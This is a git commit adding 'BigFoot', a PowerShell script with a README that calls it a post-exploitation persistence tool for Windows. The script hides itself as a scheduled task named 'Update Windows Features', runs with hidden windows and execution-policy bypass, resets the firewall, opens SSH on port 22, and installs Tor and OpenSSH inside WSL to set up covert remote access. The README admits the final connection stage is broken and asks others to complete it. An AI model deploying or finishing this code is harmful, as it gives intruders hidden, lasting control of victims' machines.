d1a9251acf53a9546120b8489e7f59109373b9f0
Brianski187 <48719008+Brianski187@users.noreply.github.com>
2020-01-28 13:43:27 +0100

    Add files via upload

---
+++ PowerShell/Update-Microsoft-Features_READABLE.ps1
@@ -0,0 +1,63 @@
+﻿function addo{
+$ProgressPreference = 'SilentlyContinue';
+$ConfirmPreference = 'SilentlyContinue';
+    if((Get-WindowsOptionalFeature -Online -FeatureName *linux*).State -ne 'Enabled'){
+        Enable-WindowsOptionalFeature -ErrorAction Ignore -InformationAction Ignore -NoRestart -WarningAction SilentlyContinue -Online -FeatureName Microsoft-Windows-Subsystem-Linux -All | Select-String "Big";
+    }
+    if(!(Get-ScheduledTask -ErrorAction SilentlyContinue -TaskName "Update Windows Features")){
+        $Arg = " Out-File $env:LOCALAPPDATA\Temp\log.txt; Start-Process powershell ' -WindowStyle Hidden -ExecutionPolicy Bypass $env:LOCALAPPDATA\Temp\log.ps1'";
+        $Action = New-ScheduledTaskAction -WarningAction Ignore -InformationAction Ignore -Execute powershell -WorkingDirectory C:\Users\$env:USERNAME\AppData\Local\Temp -Argument $Arg;
+        $Trigger = @($(New-ScheduledTaskTrigger -AtStartup),$(New-ScheduledTaskTrigger -AtLogon));Register-ScheduledTask -OutVariable $null -RunLevel Highest -Action $Action -Trigger $Trigger -TaskName 'Update Windows Features' | Select-String "Foot";
+    }
+    function init{
+        if(([System.IO.File]::Exists("$env:LOCALAPPDATA\Microsoft\WindowsApps\ubuntu1604.exe")) -and (Get-WindowsOptionalFeature -Online -FeatureName *linux*).State -eq 'Enabled'){
+            function isit{
+                (New-Object -ComObject HNetCfg.FwPolicy2).RestoreLocalFirewallDefaults();
+                New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22;
+                Set-Service -Name sshd -StartupType 'Automatic';
+                Start-Service sshd;
+                $Big = "cat /tmp/bigfoot | echo '#!/bin/bash' >> /tmp/bigfoot | echo -e 'apt update -y; apt upgrade -y;\n apt install -y tor openssh-server openssh-client'"
+                $Foot = " >> /tmp/bigfoot;\n echo 'wsl /tmp/bigfoot' > /mnt/c/Users/$Env:USERNAME/AppData/Local/Temp/log.ps1; chmod +x /tmp/bigfoot; /tmp/bigfoot";
+                $BigFoot = $Big + $Foot;
+                bash -c $BigFoot;
+                $Arg = " Start-Process powershell ' -WindowStyle Hidden -ConfirmPreference SilentlyContinue -ExecutionPolicy Bypass $env:LOCALAPPDATA\Temp\log.ps1'";
+                $Action = New-ScheduledTaskAction -WarningAction Ignore -InformationAction Ignore -Execute powershell -WorkingDirectory $env:LOCALAPPDATA\Temp -Argument $Arg;
+                Register-ScheduledTask -Force -OutVariable $null -RunLevel Highest -Action $Action -TaskName 'Update Windows Features' | Select-String "Tor";
+            }
+            isit;
+        }
+        if((Get-WindowsOptionalFeature -Online -FeatureName *linux*).State -eq 'Enabled'){
+            if(!(Get-ScheduledTask -ErrorAction SilentlyContinue -TaskName "Update Windows Features")){
+                exit;
+            }
+            if(!([System.IO.File]::Exists("$env:LOCALAPPDATA\Temp\WindowsFeature.appx"))){
+                if((Test-NetConnection 8.8.8.8).PingSucceeded -eq 'true'){
+                    Invoke-WebRequest -Uri https://aka.ms/wsl-ubuntu-1604 -OutFile $env:LOCALAPPDATA\Temp\WindowsFeature.appx -UseBasicParsing | Wait-Job;
+                }
+                else{
+                    exit;
+                }
+            }
+            if(([System.IO.File]::Exists("$env:LOCALAPPDATA\Temp\WindowsFeature.appx")) -and ([System.IO.File]::Exists("$env:LOCALAPPDATA\Temp\log.txt"))){
+            Add-AppxPackage $env:LOCALAPPDATA\Temp\WindowsFeature.appx | Wait-Job;
+            $feature="$env:LOCALAPPDATA\Microsoft\WindowsApps\ubuntu1604.exe";
+            Start-Process powershell -WindowStyle Hidden $feature;
+            Start-Sleep -Seconds 45 | Stop-Process -Name ubuntu1604 -Force;
+            Remove-Item -Path $env:LOCALAPPDATA\Temp\log.txt;
+            }
+        }
+    }
+    if(!([System.IO.File]::Exists("$env:LOCALAPPDATA\Temp\log.txt"))){
+        $function = Invoke-Command -ScriptBlock {$function:init | Out-String};
+        $function | Out-File $env:LOCALAPPDATA\Temp\log.ps1 | Wait-Job;
+    }
+    init;
+}
+$id = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent();
+if(($id).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")){
+    addo;
+}
+else{
+    $Service = $PSScriptRoot;
+    Start-Process powershell -WindowS Hidden $ConfirmPreference $Service\Update-Microsoft-Features.ps1 -Verb RunAs;
+}
---
+++ README.md
@@ -0,0 +1,19 @@
+# BigFoot
+This is an attempt at creating a post-exploitation persistence script with comms using Powershell, SchTsk, Windows Subsystem for Linux &amp; Tor Hidden Services
+
+This script needs to be run with Administrator privileges so privilege escalation is required before running this
+
+
+## Progress has come to a halt because of complications in the last stage, which is the actual SSH connection. 
+(This is my first Powershell project so... Just keep that in mind :))
+
+The host (Tor Hidden Service on WSL) can not seem to accept the connection requested by the client, presumably by Windows Firewall even while accepting inbound and outbound connections. That is why I decided to post the script even though it is not complete and working, hoping someone else might figure out how to get it to function properly. If so I hope that the solution will be shared with me so I can complete it as well.
+
+
+### Steps of the script:
+
+1. enables linux feature if not enabled (**wait for script to finish and restart**)
+1. creates scheduled task to run log.ps1 if none exists
+1. after restart changes scheduled task to trigger at login to run the script again and install WSL (**wait for script to finish, log out and log back in**)
+1. creates bash script in WSL (```function isit{}```)
+1. changes log.ps1 to run ```wsl /tmp/bigfoot```
